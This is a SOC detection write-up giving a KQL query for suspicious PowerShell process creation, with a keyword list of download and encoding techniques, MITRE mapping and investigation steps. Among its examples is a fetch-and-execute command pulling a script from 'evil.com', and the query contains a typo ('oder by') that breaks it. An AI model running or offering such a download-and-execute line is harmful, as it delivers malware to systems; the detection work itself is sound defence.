# Detection: Suspicious PowerShell Execution (KQL)

## Purpose 

Detect potentially malicious PowerShell usage by identifying command lines that include command attacker techniques such as:

- `Invoke-WebRequest`
- `DownloadString`
- encoded commands
- hidden PowerShell windows

These techiques are frequently used by attackers to download payloads or execute scripts in memory.

---

## Data Source

Table: `SecurityEvent`

Relevant fields:

- `EventID`
- `TimeGenerated`
- `Account`
- `Computer`
- `CommandLine`

Event used:

- **4688** - A new process has been created

---

## Query

``` kusto
SecurityEvent
| where EventID == 4688
| where Process has "powershell"
| where CommandLine has_any ("Invoke-WebRequest","DownloadString","EncodedCommand","-enc")
| project TimeGenerated,
          Computer,
          Account,
          Process,
          CommandLine
| oder by TimeGenerated desc
```
---

## What This Detection Looks For
This query searches for:
  - PowerShell executions
  - Command lines containing suspicious download or obfuscation techniques
Examples of suspicious commands:
  `powershell -EncodedCommand aQBlAHgA`
  `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"`
Thes patterns often indicate:
  - fileless malware
  - script-based attacks
  - command and controll actvity

---

## MITRE ATT&ck Mapping
Tecnique: T1059.001 - PowerShell

Tactic:
 - Execution
 - Defense Evasion

---

## Analyst Investigation Steps
If the alert triggers:
  1. Identify the user account that executed PowerShell
  2. Review the full command line
  3. Determine if the script downloaded external content
  4. Check the destination IP/domain reputation
  5. Investigate the host for additional suspicious ativity

---

## SOC Relevence
PowerShell is heavily abused by attackers because it is built into Windows.

Detecting suspicious PowerShell command usage is a common SOC detection strategy and can help identify:

  - malware download attempts
  - lateral movement
  - privilege escalation attempts
